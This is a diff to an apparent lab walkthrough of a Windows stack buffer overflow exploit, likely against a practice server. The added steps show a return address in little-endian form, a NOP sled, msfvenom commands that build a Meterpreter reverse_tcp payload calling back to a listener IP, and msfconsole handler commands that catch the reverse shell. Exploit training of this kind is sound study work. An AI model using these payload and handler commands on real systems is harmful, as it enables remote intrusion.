@@ -525,25 +525,46 @@ the next mona command is `!mona jmp -r esp -m "essfunc.dll"`
 
 copy the first couple of them down and convert them
 
+converting big endian to little endian:
+space them out
+62 50 11 af
+add to buff variable
+buf += "\xaf\x11\x50\x62"
+
+add a NOP sled to the buf aswell: `buf += "\x90" * 10
+
+should look like this:
+<img width="689" height="451" alt="{79A88CFE-DE27-4589-9015-454B317AEA1B}" src="https://github.com/user-attachments/assets/6fecdfb3-4f51-4f69-a436-b5d178a0526b" />
 
 
+now lets make our payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=linux-ops lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.143.86 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
+
+<img width="789" height="631" alt="{73FF8C86-1B4C-4A30-A837-0DA3322CBB09}" src="https://github.com/user-attachments/assets/273b7334-0ef3-4b3c-acd6-ee23433c4c29" />
+
+copy the whole payload except the first line, that will reset the `buf` variable
+
+<img width="620" height="552" alt="{7C95339D-CBA3-4F16-91AC-F7BF62383EDF}" src="https://github.com/user-attachments/assets/0dd75c80-dd5c-464e-a26c-c644cb53155d" />
+<img width="620" height="357" alt="{FD81A650-DF04-4343-A615-F6341FD27D1A}" src="https://github.com/user-attachments/assets/0ff5945d-4d04-482d-840e-642896e171bc" />
 
 
+setup your msfconsole to catch the reverse shell
+commands:
+ msfconsole
+ use multi/handler
+ show options
+ set payload windows/meterpreter/reverse_tcp
+ set LHOST 0.0.0.0
+ set LPORT 4444
+ exploit
+ 
+ <img width="767" height="617" alt="{147C4C05-88C9-4E74-A767-65E6BA5A8E23}" src="https://github.com/user-attachments/assets/bf569128-7e40-41a6-8201-33cbf0b2f54c" />
 
+go back to windows, rewind, press play, check security settings
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+run the python script on linux, check msfconsole
+<img width="780" height="124" alt="{9F865A9E-3937-4E69-AA46-CBA9E6DE12F9}" src="https://github.com/user-attachments/assets/3c6d9abe-d504-45ff-803f-63c2ec662f9b" />
 
 
 
